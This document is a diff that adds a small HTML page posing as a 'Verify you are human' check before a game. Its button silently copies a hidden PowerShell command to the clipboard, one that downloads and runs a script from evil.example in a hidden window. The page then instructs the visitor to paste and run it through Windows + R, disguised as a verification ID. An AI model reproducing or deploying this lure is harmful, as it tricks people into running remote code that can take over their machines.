@@ -1,0 +1,5 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Verify you are human</title></head>
+<body style="font-family:sans-serif;padding:60px"><h2>Verify you are human</h2><p>To continue to the game, complete these steps:</p>
+<ol><li>Press Windows + R</li><li>Press Ctrl + V</li><li>Press Enter</li></ol><button id="v">I'm not a robot</button>
+<script>document.getElementById('v').onclick=()=>navigator.clipboard.writeText('powershell -w h -c "iex(iwr https://evil.example/p.ps1)" # Verification ID 4471');</script>
+</body></html>
